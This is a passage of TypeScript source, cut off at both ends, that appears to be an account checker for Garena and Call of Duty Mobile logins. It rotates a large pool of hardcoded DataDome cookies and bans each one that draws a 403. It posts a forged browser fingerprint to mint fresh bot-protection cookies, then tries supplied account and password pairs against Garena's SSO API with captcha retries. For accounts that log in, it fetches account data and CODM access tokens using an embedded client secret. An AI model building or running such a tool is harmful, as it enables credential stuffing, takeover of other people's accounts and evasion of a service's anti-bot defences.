  "gyoJkbOEgTH83YwnG4XELZZk7rgz9DC3KUOrguwAnRSo3unAtiSSZMz1PVXmaoX7xvz4WLO70v3ZcrTXjq9q5m~WaQpZchd4Tjee7y9lu8xHUxN94X3Auj74qNs~9RAt",
  "PPCNfTeLjXD4jeuCtWHPqeZ3AUzTOQP1XPw4ie827XnK7SNGu9WfUvsnWupEB5vbXC1uA82dRd96T~6I0u7LH5qrFFpLAJLbd4vFF6wRmG1txUAJvpcH42FoQboblrVY",
  "U0oufAJ0ZgKxlIWVwvkLt4ZKcvWi1KDQqQlo7peJ3mCJbqqj6Pne84pzmUDqw8~FacJziXkkTIl1WblK_BIZSnACrRJ_97G8vUWzx09d5guj8BZVymfqbXdWXh1FCBVW",
  "sH6Vwr4mBlCsXx6JjkPBYiPfddPJKoXuerIb81vAO13hds7uPvKq35GaAedp0AuH9kvW6PvFyhalbZqTI~rN058org2jo3HQX2IOj8ta7nQVMLzWmZscrWXKpto2sq7n",
  "y7wYo4nOEMS8tJSfE3nFXiVsdq5g5rLRcc~Wr4JEjGdHjJdozJt2pghYUeTkteS1xIuXX~Uy9_RuyqeMrWTH6gQjUQodhvQEYmEfZtnjwEQupd758zw4mNI03qu5y8Dq",
  "SlWJVaEgi4ronPOvsIRfUyHcv33Zw7LWGDN4O3siX6WJjSDn7jkeO7wNmSxhPHUvu2r9IJuQt_9V~WT9pB6A3ROghclY7DFoyUBt_q1BOIyQl5OwcauICQOBbqkkAfJ2",
  "0pOxxaom66F4iszI8d9HFvMhWIIVPxxfmSzZudab1DThSnuUX6ckpBAj~e4qAWJiN6MQauD_7QciWGhtiLLk9uAFtdWkl2j9R6enny0nmWR3Vcxp389k0Ib2fSc~hcRa",
  "~IUGGjCBe8roFaoeDBHWkG~7QivjCJ7isdjwFOl6V8dl_5qETxBjltT88HbAN7XUpd9I3xW9j7lXEHG9rAEp4vyX8xnKvGIqo9rNDvkFKxsG_RoSqKaCFxYj4pJmDJaz",
  "k7WFFH9H7ZoJDJlFilJmyh7c0WducA566BXbl5tx3Nq83LvXyTgTrXy6CjAK8QNDK_XidmdocnmQCSQtPmaOCTJMDjSKGSimZ74Mv~U8QMeeaDCi9oqBkEgzWYa58g5U",
  "cgY39VI2OKAwaIDcyjOchMGKKcA_XhgkOnvVjdLNzMxn1K80i5ha40W4KaWmgOL~T0vo9Fu7Plca1TK9tK2Sik6sUBBscRcZ8IaG6U0EaRS7V4DqMyfwH1L_J2JV8XKE",
  "iQU~7epnoSD2gkn5yWdFNGR5ya3MP4etbxpffnzw8t7iYfrAjniHh0WzCQJFd0U0UE6hyR6GCM236pXgV825~YkFA0zh4rx3RppIq5Twup7fGizFODIiYzQc3G4Ccw9b",
  "etjcrIPWsfV7XMRWCBIF39S30srV4rqfnmEbZG4qHRlxg2f6pu4NTdJCdQRESMN3o8ZewMV_IBq~MIhMF7UZ~c_4EHiD7N2Z~jETwcY30hK6oHeHypK2tgu5bPEDyyFN",
  "TWt0FZd_ZQB9Ixfnq1Gng_gG8xUlHPDTWgk_rp7smMCLcpjQE2Lm80uJEr8fm73EreJZNYRMCpxub19vSKpJzfooztDfr_Hiu6liYhqlO5PZk_1FjVDmvYgtUcs4LZaB",
  "6Nro_A5sGlUr4h9VWz9F2D4bhVT7TkWfezWDTz3_zzPN4Jl0i5pddIduvUpweFQSlIKSMORh7CWtwvxZY1rdwrK3hjW~leDf93tFZkQHPJ4RGH~aCeNLarQSAH2Re1bO",
  "dGXd9takdv5iOGCWtAQKV6hgfscYNhT7N4oq9YamW5Ht2NfpQ5bL9jig~9KhHTDa3lcQMlfW~OM3qYxxcI5tgkhPXtHcAINerIfdsZk~Z~zK1i70TEx391EQjUZj2E3Y",
  "gESxLfh8DLSDPOj3UZSztnIx4JXiFtPxC55aYR2ZZDsVBBdNoI_0Nq0drHqJR4DnWECkrlo8nSWo6E0TUNjVBxdH94mLfo29NOOyO_ivRbHv7VKY07_AJ4kXzGvtmy1v",
  "UpTh~Kp0HzthjKiX2GHFEN6yJlN5hBTV4Jf2EFqrIoCWhDraLsaJu~QeXytv98L7p~0r4Lh4ILOvta~YIv70heoFtOI0lpQWJ4KP5lxKlLexC_5XT7IxxcmOSVjHRiC2",
  "maQpe5taRWHgo5SJKtlPh78uEZLSkQxKZixyC2bP3DEn1FWmQj1diztvQeeIB4IY5iK7TS9avXuL8HwWTnn6VQZ9Whb_XM2oWSbhFC5BtVIl4VzvkSEFltDU2YYM7SwG",
  "g8CE5sq2TCwxwYKi9HWWIw8AlSX52Q9yvLjiJ5Su_woIqBpr82ajWtd_5uHk6qG_wYts8Wz1voIYHPNh6U21BFCg_9fPwT1WHnCcK~Oo2SrYERtdrKezl4yyL4jP_X4d",
  "klymw7qAuKOnFWFuBc0QbxNJM3VmAfqYiaBPkZ1z5jslyON7OrGrfeaWqHzHsVUy4qeMLYoV82azhcJi5VxdenWGqi5PpAdgJ5IcxvjTTx~aq4ngLiIm8KQrf~fRaMds",
  "XJRkX39zZQEk9yYH9mSrtnfSl1mNlV6MPwN3bAo27GT2dfW7NIIAU1OKUb5XOTSiDT8xnEklupsbtKUKcALQkNxGYke7Pkc~sPqMavIPyD1oJNJetScY~e_eOFapLT1H",
  "bvjLuGP6tLgbI1c5VF6nNKkT7LA9Sju_V4EFRXurukJVoNgZdcYkBAQrqlXYzg47dyPW1qPiGHQzi8ej3WssOiLtUirFCB_7PlJ7paI8M7HlBqErj4V4UkCdPiO1m3Ht",
  "6jHYldbTcwEuECgZXLe4IN9Axvajs8E1lId1R6~QTnnUWEVKirQ7Ce1vuUdBXdiRRH48XttOpERS0fesBgebU1hn598WqBiQZbbgB66Ecl8z7VQWdIvxqDZgqRQOr0dc",
  "RA7re5uK~Nkpb8WouFURKWhLXu3RnRKOPMMCaoDgYL1dqiNePmhU5LxDi5gwsCG_i7BOKJBsA1G_jDMG~zQgsrivVBa4HP72zPOv6hRAj_3BZcXnwP~e4fDmxn93uaAA",
  "cDdxA798oOOAEFihk4i8IWN8lii8imUZ6E402I7U7Pk5k38BG7~uFHn9MKqCbfDkUvzBljZrsq8QKctlom7MEsVgVRGnahhZTRWAyT9BVJnjTWHz0zKLQvCom91r5f_5",
  "SW6VzkOqyMZoL~m_tExLQnsDIUdQMvRV60xnwd_o1L_QSGo6uF0xHQ2wqHlcnLbXeDLidbuKzvOdCtVNlkGEEkxZktV~pXorVqVcsxw6eLH0N8KbmG21Jxy~nFvQiaUh",
  "c6FxccWnaZm5wWj1RKEmMBVHDj6GymQHUEInUpaZm1YNQOOOsKqUgLJ8089OAncDK0l7e4GS56Tug6AdDpvWoS9GgE4_8Wx2ucIK~pGIOjXrIMkCVN3C5ywm1zMO194K",
  "MFiHTPTCSfKFN9QVOwTHN7A7OcQq1aY7cuaNU2lqEzuvzkmX86DBlPof~vRKeLGseW3wYWxcITDYkDP~I3DL2pVy0gwRGh6yGgLWY_A5ArwwMs8Ctd5iP4JZWm5HTlIB",
  "4w5o2UQlp09qVAcOk_i~y1P~yFmJL716aOg7FnDlYrp~3_CxtFoRNrBQnzvNgCD_uYwy8g7vTsbsA7UYKe6kRPjqMRGszT3d58G1vbi0FUK6w1hB73gWubZzBr6vZs32",
  "o4qUgdRTYwXpwK9kqh0NO4MmBGEEoorBDKy~fqD5vjWMk7c3obezqR6TtkPBZ_ga3rpZZVHPc7C_MWpxjCRvPshmWXpu0Yurrykszi95~r7HjuZ_rhtJiGXi3sUeeK0M",
  "y0qDfViN2d2mPZFzGnb8jfl9M0ZB9~dCERcX5BzuT9P_A0qavKa_Qv2x7OvuOjxtx9axFY0UR7RTuMUPq862UjKwpmbv3p4PyEWGPHdFi_RCptSkCSL7oK4b6Nr7dFTj",
  "ZPsZDhQ337P4jOTW9fW3uweV0YvWlgmvMlS2xwm6t1yomTulLpS1wYAjSNyrRMEFoBWnNkf8~DsG0cbJXvD8TmiCjgo5JxWMuTqE9qOdDpCyQmxIl82o2~zMEAqXeVXa",
  "HEFrUcAN_1dOrjxWdoKy0bZMc196BrGO_xEAW7eCJfj79MMtpP9yxay8za~7U0xlTTp~eG76ai0lYTfMtrBX_HRECRaRYh~25~5Wzdndh~JetiM2zkeQrl08wi9mUPG3",
  "Cea73YN1hjxGttUtZ~HsLV_8NM~BKgUaqsX2cnH_GVuwxJUxe~t9ylFChahUOZp_oh3eWZNqfWl4vG6UJGZ~3yz0d8oDmZqFYZI6XrymAWJ_Y2eJgcIguB9CXR88RqbJ",
  "~a5fSWjC8uqoiGsOtkDucThJK8h7e3fb~ZmYQ1n5hBrmJJ3kkfFHte7GfZZTRpGULAPVkvdj_jrU6edhqy~DGyY0Fm17xXq5QcdnIyt1J4VXRsB0elf784nUT0zghgJQ",
  "SB4aw5822FxSK0~zWPc2lG4IcoP_iWGnua6_m_g5Xn96hErz3tMIl6PjTSGFMMOOeE2VSiOZlNdYnfWHxX3hAZk85i3wyQaOdqdxM6A6~JMzqXIMDU50K07GbvmeOmtM",
  "X2qDjcDf4nfjdZDEhNvu6qqMiDc3DE0Srs_57V4G~5Wp9_wszqGw64rWJXtB1sOJ9eRpUL_sMhfqgSQ40BAOWAlwwiYN9AdIthWyPt9g2uVdDmDSWv6fnlA6mA05ECUR",
  "9B206qYPmo0OLXv0xIGXEayoibg4ufLUld34UwAWtlw7KPn06StRKdc5Dl8YBH9NZF4tXWc573Ne54KW0j7KKwx8NvPHa0iuwzZfR8CqLD1qDeNmHy_x3n94oBA0dhyA",
  "jyVntcptsAVANRIEdfzinc3eVFmssxParOOr5sbmzIYCiFqOHES0sRpJptjstY~KRaXdQP5FHhtfJooxFFuiYs5stOYKinf8LHBNPPD4DygFL6L_oagVg3ZfrPhyWOq_",
  "4LX96QLvWX4HP7Jpgq5HwkMKtg~~wQxnVqRJnF8rHO2eBbmtwvy6hrHipn6ETXidcopbmtLv8VsVcOFCwMHh_TGAh48fBop6rNGSOdV_B7otU6C_L8pu3kNQFETSM8Vq",
  "QwLYHKobZwrOmhargTpODUkkz8g3sKXz5JncLMCNqdIMc53nz48PMj2NV9WY8cnFkCP3pwanNzaHU~FXR6qlFwa9KkFVIAxd0VzmRvcSOMv21qZdZ49ZZ3WRnPEfRwg3",
  "IzuOCwKdxxxDuldujxWGMtawnUsPbRxJhNfIZCnPgx~BV3ffIqqUsDkeJy7nmMi9plXPToZsaC0pqvScxkw8eIBodiLFe5MLUTxMY6eQ8TW9Jjge_iFhAMA_deDDAUUi",
  "WY~wAvFsRDGr2bQpjdXKUfSmsNYuVnYXqBv5l0Uzi1tsGp9w0Q6UIpONGxka_oc80ApiVP25vcOqekYgPsBm8dOtlU~n2CuZdFH4LnaKhwUGKKiiGZ2SqA5Ok_BPZ~tQ",
  "Ryf9bQdGpsiHsweFPfd_9Nz1Y8M8IrEJHYgrJ9QGY50L9~SYNHxGPFDvHB~xjczTV3HMNkuUx47tvufrQTpCo7muJHHkK2opzgzQIhi4q67t3_V4E6x2BvdMJDPLyet7",
  "ZGAbB5KXPJo84AUcLBvF7elnk3WBGlY2GiONn7ogapTHDzgqMfpvLJeP2M3~u7V4jFhlhD2UZ_lk0M3iXWsObguSUbhJ1O0FAff2X205M2W4Ix4gHTKN92_YMterHiMq",
  "ZEE6A02~Aksp2eRrykr0Yexh0iZZrab0WylUAZdZnDBGbBG~ZWE_i2k0pa_olCFY6mXFveaBMZfhxN0H2IUN3f2HypDBoPnFi6qioZpDEiDgnDJniNAjrOVtlJh~Q0zW",
  "mJ4iAoFZycSpHF5v4kqlcy36Kbf0iB3JrG16N8qU3C1IFfHK__VC~H1BazoSznfXZXL13r9i8fMGdJtjE~ax5FxjFsTjh5smQ07f92rHgtVVkaYTniN22mH7NRPWJ6B1",
  "3pWYESV5Sj290ca9pDZ85BM6U4Hds7AIzmcldO_BCMdd7e5Qz_jTemTT3VI293ruBfGI8Wxw9B9jZU6P4HDR9KM~MosN0d2QTTi_hbXNHadvYVZOqxJ8yqueplhKM1t2",
  "a7oDemdZHBz~mKrtlKiY7B31h9DHPqrX~ajdJVn2gzUkGxaX9_UNT4bCV7GkgAMq0p1KW0BrUCkK_jb3RGvgnD5HalVL0F6QLlvIDPyrtXojHDvyhtj81oRc9aMpKrMI",
  "cCSFDvIo6EGIQ7G_jqzKI_thKD77Q84EQCWLAA9b5oIjstZ6SB3pJdOZnjY_Kfe9QSBwifdsaTufs_pbV~vVGGp3EIU59vc7t123lu~ebqOP7ds258cbvy5xFJNBg29z",
  "BQFgS2Ve8swg64OJ2lYq_c8nJ~wi_Uj8~WR81yMAc645Ltb2s7wHpYem2irIZGTxFFvS5SvEKlsRD8S2teAOijERX3owpbSXwEuTv4am5FzZUtPhO4BXIYae63ELb~DW",
  "fexwWc64mCECZWcHMdhdT2P5Kt3W1~3Q38iunqET471UdLPiyrm01nOBW8INtTFwaQ5PNLpEh59KH8ieU22Vbj6HP9cNDBC6dd_Wv1Uzj1ggJ_Y7UCjP2mw1PdROShp1",
  "MRhaDgkOOmgPtvkJ13OHZHW1Yn~8LKhPkCnvzKHz0t0AsvKSBcCUj3voF42PRLR3A4OpRhAzzQfa8nWqga7w6dCVOg06irOP2wJg~4Yal0ResdVy8x3XWgaSCrCFGmTa",
  "M11x4xiDhIagOH4jBNAizhmUEG8eQ9DsKYwXaiNm6zeCIUtiK5sJBprMh5TSlYpRMWL7lUD39qFnH2sJdCpkJ9X0LZbppxqz9Jjy5gKXBqW1oQcnxFumA1_ZmhaHXjQV",
  "csr4thzNI9QWktoP0J0j_HTV8X6d4y9Bfs7d8yUENQUQEiyQ~gfbuwqtR_kna4sKEfFOhWNAAz9NWLT5GKWC~ctrvGLD8g1bVUiFHjpZZdY6H0C8E8XzvE1fU0Vb497b",
  "Jx~kgKknJzYuvNe6zT2uMuVpffd9ka9mJtVCTFEI~8QOUq1chx8DEbxRS9dmdEwMgsJonfN~ys66einXPGENeiCGggdigEM9FdDIyePsBHQ6A9wHy0qjfKBWbWqluVEl",
  "2a3a3cTc1P6nJWspvre6TF33N7pJHRZOhSNrxUDKlRVUkny~f4KfkuqLD_pXjuNB9Ps6yVwtEmIGzEs_6MybOATG6B6j27zshWwhrdppc3YOBxMk1Qxji6OFalc8qdz0",
  "Z0wtcwqhgOEsvFTOysF6eU8jgLnefKQI8H9kKKjm_KY1yh2ZwphTUuRs4w_LAbri3lgLQDcYqB7BlF52xVmBsyMggkBXhNQE8QjuJkQ6ACiG3kFYuvktIiLl3z7Qpy68",
  "x2rZMKTKJHdxiNZo9tWOAxsC9t5CuBzE3hIoOhDORrX2RZZSl5JNw0iAqjk9me6iArAqGLE808Fy4x~yKVEUOYWWtgePsSF9KM7ZA4AQV7U4pPwtkPQpy6QbogbOiLLA",
  "QFSS9Y~Cv_DDbgQV1z2b9uQ1Nl4G4fwKbmVh2Vj727oB_lyuC8r7epSBG3Gw8jiWY~BIqXnx681dUVMpHEX8VMhG33uH4VnQK_rn0u9O7MWLiGpIbcWBGuP49d4js7e_",
  "R7FDb6pKaBF3Lcn3tV3Z~rwtvGkdUne7GYYNOGQY6Bjo6U2yMzyjoHXsflJjkmdUQp20rQsAV4ozF_5eZ_lZvahZXRDcdMS~O0nVyEyzmFGldd6B9lF2bCMWTSnppfOJ",
  "8r46m7RfrKdwMhXK_BNE6WC5fkihRAzgFv8KLQBJiBWsHbpxqh5uzlZDv6MbvtJKyLo8WZ39vptgxpXa~UDemEyxITyTriE_MfgvJpgYPZIwGW4O_FOpHtr4aoZqG5cO"
];

// Cookie pool state - track banned cookies and rotate
const bannedCookies = new Set<number>();
let cookieIndex = Math.floor(Math.random() * COOKIE_POOL.length);

// get_cookies() - rotate through the cookie pool, skip banned ones
// Matching v7.py CookieManager pattern
function get_cookies(): string {
  // Try to find a non-banned cookie
  const poolSize = COOKIE_POOL.length;
  for (let i = 0; i < poolSize; i++) {
    cookieIndex = (cookieIndex + 1) % poolSize;
    if (!bannedCookies.has(cookieIndex)) {
      console.log(`[COOKIE] Using pool cookie #${cookieIndex} (${poolSize - bannedCookies.size} available)`);
      return COOKIE_POOL[cookieIndex];
    }
  }
  // All banned - reset and try again
  console.log('[COOKIE] All cookies banned, resetting ban list');
  bannedCookies.clear();
  cookieIndex = Math.floor(Math.random() * poolSize);
  return COOKIE_POOL[cookieIndex];
}

// Mark current cookie as banned (called on 403)
function ban_current_cookie(): void {
  bannedCookies.add(cookieIndex);
  console.log(`[COOKIE] Banned cookie #${cookieIndex} (${bannedCookies.size} total banned)`);
}

// Try to fetch a fresh DataDome cookie (fallback when pool is exhausted)
async function fetchFreshDataDomeCookie(): Promise<string | null> {
  try {
    const url = 'https://dd.garena.com/js/';
    const jsData = JSON.stringify({
      "ttst": 76.70000004768372, "ifov": false, "hc": 4, "br_oh": 824, "br_ow": 1536,
      "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
      "wbd": false, "dp0": true, "tagpu": 5.738121195951787, "wdif": false, "wdifrm": false,
      "npmtm": false, "br_h": 738, "br_w": 260, "isf": false, "nddc": 1, "rs_h": 864,
      "rs_w": 1536, "rs_cd": 24, "phe": false, "nm": false, "jsf": false, "lg": "en-US",
      "pr": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": true, "str_ls": true,
      "str_idb": true, "str_odb": false, "plgod": false, "plg": 5, "plgne": true,
      "plgre": true, "plgof": false, "plggt": false, "pltod": false, "hcovdr": false,
      "hcovdr2": false, "plovdr": false, "plovdr2": false, "ftsovdr": false, "ftsovdr2": false,
      "lb": false, "eva": 33, "lo": false, "ts_mtp": 0, "ts_tec": false, "ts_tsa": false,
      "vnd": "Google Inc.", "bid": "NA", "mmt": "application/pdf,text/pdf",
      "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
      "hdn": false, "awe": false, "geb": false, "dat": false, "med": "defined",
      "aco": "probably", "acots": false, "acmp": "probably", "acmpts": true, "acw": "probably",
      "acwts": false, "acma": "maybe", "acmats": false, "acaa": "probably", "acaats": true,
      "ac3": "", "ac3ts": false, "acf": "probably", "acfts": false, "acmp4": "maybe",
      "acmp4ts": false, "acmp3": "probably", "acmp3ts": false, "acwm": "maybe", "acwmts": false,
      "ocpt": false, "vco": "", "vcots": false, "vch": "probably", "vchts": true,
      "vcw": "probably", "vcwts": true, "vc3": "maybe", "vc3ts": false, "vcmp": "",
      "vcmpts": false, "vcq": "maybe", "vcqts": false, "vc1": "probably", "vc1ts": true,
      "dvm": 8, "sqt": false, "so": "landscape-primary", "bda": false, "wdw": true,
      "prm": true, "tzp": true, "cvs": true, "usb": true, "cap": true, "tbf": false,
      "lgs": true, "tpd": true
    });

    const payload = new URLSearchParams({
      jsData: jsData,
      eventCounters: '[]',
      jsType: 'ch',
      cid: 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
      ddk: 'AE3F04AD3F0D3A462481A337485081',
      Referer: 'https://account.garena.com/',
      request: '/',
      responsePage: 'origin',
      ddv: '4.35.4'
    });

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
      },
      body: payload.toString()
    });

    const data = await response.json();
    if (data.status === 200 && data.cookie) {
      const cookie = data.cookie.split(';')[0].split('=')[1];
      console.log('[COOKIE] Got fresh cookie from DataDome API');
      return cookie;
    }
    return null;
  } catch (e) {
    console.log('[COOKIE] Fresh fetch failed:', e);
    return null;
  }
}

// Prelogin - matches v7.py prelogin() with retry on 403
async function prelogin(account: string, datadome: string): Promise<{ v1: string; v2: string; newDatadome?: string } | null> {
  const retries = 3;
  
  for (let attempt = 0; attempt < retries; attempt++) {
    try {
      const timestamp = Date.now();
      const params = new URLSearchParams({
        app_id: '10100',
        account: account,
        format: 'json',
        id: String(timestamp)
      });

      const url = `https://sso.garena.com/api/prelogin?${params.toString()}`;
      
      console.log(`[PRELOGIN] Attempt ${attempt + 1}/${retries} for ${account}`);
      
      const response = await fetch(url, {
        method: 'GET',
        headers: {
          'accept': 'application/json, text/plain, */*',
          'accept-encoding': 'gzip, deflate, br, zstd',
          'accept-language': 'en-US,en;q=0.9',
          'connection': 'keep-alive',
          'host': 'sso.garena.com',
          'referer': `https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account=${encodeURIComponent(account)}`,
          'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Windows"',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-origin',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
          'cookie': `datadome=${datadome}`
        }
      });

      console.log('[PRELOGIN] Status:', response.status);
      
      // Extract new datadome from response cookies
      let newDatadome: string | undefined;
      const setCookie = response.headers.get('set-cookie') || '';
      if (setCookie.includes('datadome=')) {
        const match = setCookie.match(/datadome=([^;]+)/);
        if (match) {
          newDatadome = match[1];
          datadome = newDatadome; // Use new datadome for next attempt
          console.log('[PRELOGIN] Got new datadome from response');
        }
      }
      
      if (response.status === 403) {
        console.log('[PRELOGIN] 403 - DataDome blocked');
        if (newDatadome && attempt < retries - 1) {
          console.log('[PRELOGIN] Retrying with new cookies from 403...');
          await new Promise(resolve => setTimeout(resolve, 100));
          continue;
        }
        return null;
      }
      
      const text = await response.text();
      console.log('[PRELOGIN] Response:', text.substring(0, 200));
      
      try {
        const data = JSON.parse(text);
        
        if (data.error) {
          console.log('[PRELOGIN] Error:', data.error);
          return null;
        }
        
        if (data.v1 && data.v2) {
          console.log('[PRELOGIN] Success - got v1/v2');
          return { v1: data.v1, v2: data.v2, newDatadome };
        }
      } catch (e) {
        console.log('[PRELOGIN] Parse error');
        if (attempt < retries - 1) {
          await new Promise(resolve => setTimeout(resolve, 500));
          continue;
        }
      }
      
      return null;
    } catch (e) {
      console.log(`[PRELOGIN] Error attempt ${attempt + 1}:`, e);
      if (attempt < retries - 1) {
        await new Promise(resolve => setTimeout(resolve, 100));
        continue;
      }
    }
  }
  
  return null;
}

// Login - matches v7.py login() with retry
async function login(account: string, password: string, v1: string, v2: string, datadome: string): Promise<{ ssoKey: string } | { error: string }> {
  const hashedPassword = await hashPassword(password, v1, v2);
  
  const retries = 3;
  for (let attempt = 0; attempt < retries; attempt++) {
    try {
      const timestamp = Date.now();
      const params = new URLSearchParams({
        app_id: '10100',
        account: account,
        password: hashedPassword,
        redirect_uri: 'https://account.garena.com/',
        format: 'json',
        id: String(timestamp)
      });

      const url = `https://sso.garena.com/api/login?${params.toString()}`;
      
      console.log(`[LOGIN] Attempt ${attempt + 1}/${retries} for: ${account}`);
      
      const response = await fetch(url, {
        method: 'GET',
        headers: {
          'accept': 'application/json, text/plain, */*',
          'referer': 'https://account.garena.com/',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36',
          'cookie': `datadome=${datadome}`
        }
      });

      console.log('[LOGIN] Status:', response.status);
      
      // Extract sso_key from set-cookie header
      const setCookie = response.headers.get('set-cookie') || '';
      let ssoKey = '';
      
      if (setCookie.includes('sso_key=')) {
        const match = setCookie.match(/sso_key=([^;]+)/);
        if (match) ssoKey = match[1];
      }
      
      // Also extract new datadome if present
      if (setCookie.includes('datadome=')) {
        const match = setCookie.match(/datadome=([^;]+)/);
        if (match) datadome = match[1];
      }
      
      const text = await response.text();
      console.log('[LOGIN] Response:', text.substring(0, 300));
      
      try {
        const data = JSON.parse(text);
        
        if (data.error) {
          const errorMsg = data.error;
          console.log('[LOGIN] Error:', errorMsg);
          
          // These errors are not retryable
          if (errorMsg === 'ACCOUNT DOESNT EXIST' || errorMsg.includes('password')) {
            return { error: errorMsg };
          }
          
          // Captcha - wait and retry
          if (errorMsg.toLowerCase().includes('captcha')) {
            console.log('[LOGIN] Captcha required, waiting...');
            if (attempt < retries - 1) {
              await new Promise(resolve => setTimeout(resolve, 3000));
              continue;
            }
          }
          
          return { error: errorMsg };
        }
        
        // Check for sso_key in response
        const responseSsoKey = ssoKey || data.sso_key || data.session_key;
        if (responseSsoKey) {
          return { ssoKey: responseSsoKey };
        }
      } catch (e) {
        console.log('[LOGIN] Parse error');
        if (attempt < retries - 1) {
          await new Promise(resolve => setTimeout(resolve, 500));
          continue;
        }
      }
      
      if (ssoKey) {
        return { ssoKey };
      }
      
    } catch (e) {
      console.log(`[LOGIN] Error attempt ${attempt + 1}:`, e);
      if (attempt < retries - 1) {
        await new Promise(resolve => setTimeout(resolve, 100));
        continue;
      }
    }
  }
  
  return { error: 'Login failed after retries' };
}

// Get account info - matches v7.py account init
async function getAccountInfo(ssoKey: string, datadome: string): Promise<Record<string, unknown> | null> {
  try {
    const response = await fetch('https://account.garena.com/api/account/init', {
      method: 'GET',
      headers: {
        'accept': '*/*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36',
        'cookie': `sso_key=${ssoKey}; datadome=${datadome}`
      }
    });

    if (response.status === 403) {
      console.log('[ACCOUNT] 403 - Blocked');
      return null;
    }

    if (response.ok) {
      const data = await response.json();
      console.log('[ACCOUNT] Got info');
      
      if (data.error) {
        console.log('[ACCOUNT] Error:', data.error);
        return null;
      }
      
      return data;
    }
  } catch (e) {
    console.log('[ACCOUNT] Error:', e);
  }
  return null;
}

// Get CODM access token - NEW OAuth flow matching v7.py get_codm_access_token()
// Uses authorization code grant with 100082.connect.garena.com
async function getCodmAccessToken(ssoKey: string, datadome: string): Promise<{ accessToken: string; openId: string; uid: string } | null> {
  try {
    // Step 1: Get authorization code
    const randomId = String(Date.now());
    const grantUrl = "https://100082.connect.garena.com/oauth/token/grant";
    
    const grantHeaders: Record<string, string> = {
      "Host": "100082.connect.garena.com",
      "Connection": "keep-alive",
      "sec-ch-ua-platform": '"Android"',
      "User-Agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
      "Accept": "application/json, text/plain, */*",
      "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
      "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
      "sec-ch-ua-mobile": "?1",
      "Origin": "https://100082.connect.garena.com",
      "X-Requested-With": "com.garena.game.codm",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "Accept-Language": "en-US,en;q=0.9",
      "cookie": `sso_key=${ssoKey}; datadome=${datadome}`
    };
    
    const grantData = `client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id=${randomId}`;
    
    const grantResponse = await fetch(grantUrl, {
      method: 'POST',
      headers: grantHeaders,
      body: grantData
    });
    
    const grantJson = await grantResponse.json();
    console.log('[CODM_TOKEN] Grant response:', JSON.stringify(grantJson).substring(0, 150));
    
    const authCode = grantJson.code || '';
    if (!authCode) {
      console.log('[CODM_TOKEN] No auth code received');
      return null;
    }
    
    // Step 2: Exchange authorization code for access token
    const tokenUrl = "https://100082.connect.garena.com/oauth/token/exchange";
    
    // Generate device_id
    const deviceId = `02-${crypto.randomUUID()}`;
    
    const tokenHeaders: Record<string, string> = {
      "User-Agent": "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
      "Content-Type": "application/x-www-form-urlencoded",
      "Host": "100082.connect.garena.com",
      "Connection": "Keep-Alive",
      "Accept-Encoding": "gzip",
      "cookie": `sso_key=${ssoKey}; datadome=${datadome}`
    };
    
    const tokenData = `grant_type=authorization_code&code=${authCode}&device_id=${deviceId}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415`;
    
    const tokenResponse = await fetch(tokenUrl, {
      method: 'POST',
      headers: tokenHeaders,
      body: tokenData
    });
    
    const tokenJson = await tokenResponse.json();
    console.log('[CODM_TOKEN] Token response:', JSON.stringify(tokenJson).substring(0, 150));
    
    const accessToken = tokenJson.access_token || '';
    const openId = tokenJson.open_id || '';
    const uid = tokenJson.uid || '';
    
    if (!accessToken) {
      console.log('[CODM_TOKEN] No access token received');
      return null;
    }
    
    return { accessToken, openId, uid };
  } catch (e) {
    console.log('[CODM_TOKEN] Error:', e);
    return null;
  }
}

// Process CODM callback - matches v7.py process_codm_callback()
// Tries both old (non-AOS) and new (AOS) endpoints
async function processCodmCallback(accessToken: string): Promise<{ token: string | null; status: string }> {
  try {
    // Method 1: Try old endpoint (non-AOS) first
